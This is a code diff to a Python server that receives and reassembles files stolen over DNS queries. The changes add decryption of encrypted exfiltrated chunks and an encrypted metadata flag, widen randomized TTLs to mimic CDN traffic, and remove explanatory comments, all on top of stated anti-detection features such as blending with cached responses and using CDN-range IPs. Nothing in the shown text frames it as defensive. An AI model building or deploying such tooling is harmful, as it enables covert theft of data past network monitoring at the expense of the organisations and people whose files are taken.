@@ -8,7 +8,7 @@ reassembles the exfiltrated file.
 
 Anti-detection in responses:
 - Matches response type to query type (A->IP, AAAA->IPv6, CNAME->domain)
-- Randomized TTL per response (30-600s)
+- Randomized TTL per response (60-3600s, realistic CDN range)
 - No authoritative flag (aa=0) to blend with cached responses
 - Realistic response IPs from CDN ranges
 
@@ -47,6 +47,7 @@ from config import (
     RESPONSE_TTL_RANGE,
     SESSION_KEY_LENGTH,
 )
+from crypto import decrypt
 from encoding import decode_hex_split, decode_wordlist, extract_sequence
 
 
@@ -59,6 +60,7 @@ class Session:
         self.chunk_count = None
         self.original_hash = None
         self.compressed = False
+        self.encrypted = False
         self.chunks = {}
         self.created_at = time.time()
         self.linked_from = None  # previous session ID if rotated
@@ -90,8 +92,6 @@ class DNSExfilServer:
         self.sessions = {}
         self.session_chains = {}  # maps new_id -> old_id for linking
         os.makedirs(OUTPUT_DIR, exist_ok=True)
-        # Derive session key (must match client's key for XOR decode)
-        # In production, this would be pre-shared or derived from a shared secret
         self._default_session_key = None
 
     def set_session_key(self, key_hex):
@@ -162,7 +162,6 @@ class DNSExfilServer:
         src_port = pkt[UDP].sport
         dst_ip = pkt[IP].dst
 
-        # Map query type number to response
         ttl = random.randint(*RESPONSE_TTL_RANGE)
 
         if qtype == 28:  # AAAA
@@ -214,14 +213,11 @@ class DNSExfilServer:
             raw = self.decode_labels(data_labels)
             old_session_id = raw.decode()
 
-            # Link new session to old session
             self.session_chains[new_session_id] = old_session_id
 
-            # If old session exists, new session inherits its data
             root_id = self._get_root_session(new_session_id)
             if root_id in self.sessions:
                 print(f"  Session rotation: {old_session_id} -> {new_session_id}")
-                # Create new session entry pointing to root's data
                 if new_session_id not in self.sessions:
                     self.sessions[new_session_id] = self.sessions[root_id]
             else:
@@ -231,16 +227,14 @@ class DNSExfilServer:
             print(f"  Rotation decode error: {e}")
 
     def handle_metadata(self, session, data_labels):
-        """Process a metadata query containing chunk count, hash, and compression flag."""
+        """Process a metadata query containing chunk count, hash, and flags."""
         try:
             raw = self.decode_labels(data_labels)
 
-            # Extract embedded sequence number (should be 0 for metadata)
             if self._default_session_key:
                 _, raw_data = extract_sequence(raw, self._default_session_key)
                 text = raw_data.decode()
             else:
-                # If no key set, try to decode raw (backwards compat)
                 text = raw.decode()
 
             parts = text.split("||")
@@ -249,9 +243,12 @@ class DNSExfilServer:
                 session.original_hash = parts[1]
                 if len(parts) >= 3:
                     session.compressed = parts[2] == "1"
+                if len(parts) >= 4:
+                    session.encrypted = parts[3] == "1"
                 print(f"  Metadata: {session.chunk_count} chunks, "
                       f"hash={session.original_hash[:16]}..., "
-                      f"compressed={session.compressed}")
+                      f"compressed={session.compressed}, "
+                      f"encrypted={session.encrypted}")
             else:
                 print(f"  Invalid metadata format: {text}")
         except Exception as e:
@@ -265,7 +262,6 @@ class DNSExfilServer:
             if self._default_session_key:
                 seq_num, chunk_data = extract_sequence(raw, self._default_session_key)
             else:
-                # Fallback: first 2 bytes are raw sequence
                 seq_num = int.from_bytes(raw[:2], "big")
                 chunk_data = raw[2:]
 
@@ -289,6 +285,15 @@ class DNSExfilServer:
         if data is None:
             print("  Reassembly failed - missing chunks.")
             return
+
+        # Decrypt if needed
+        if session.encrypted and self._default_session_key:
+            try:
+                data = decrypt(data, self._default_session_key)
+                print(f"  Decrypted: {len(data)} bytes")
+            except Exception as e:
+                print(f"  Decryption failed: {e}")
+                return
 
         # Decompress if needed
         if session.compressed:
@@ -351,7 +356,6 @@ class DNSExfilServer:
         root_id = self._get_root_session(session_id)
         if root_id not in self.sessions:
             self.sessions[root_id] = Session(root_id)
-            # Also map current ID if different
             if session_id != root_id:
                 self.sessions[session_id] = self.sessions[root_id]
             print(f"\n[+] New session: {root_id}")
@@ -395,7 +399,6 @@ def main():
 
     server = DNSExfilServer()
 
-    # Accept session key as argument for XOR sequence decoding
     if len(sys.argv) > 1:
         server.set_session_key(sys.argv[1])
         print(f"Session key set: {sys.argv[1]}")
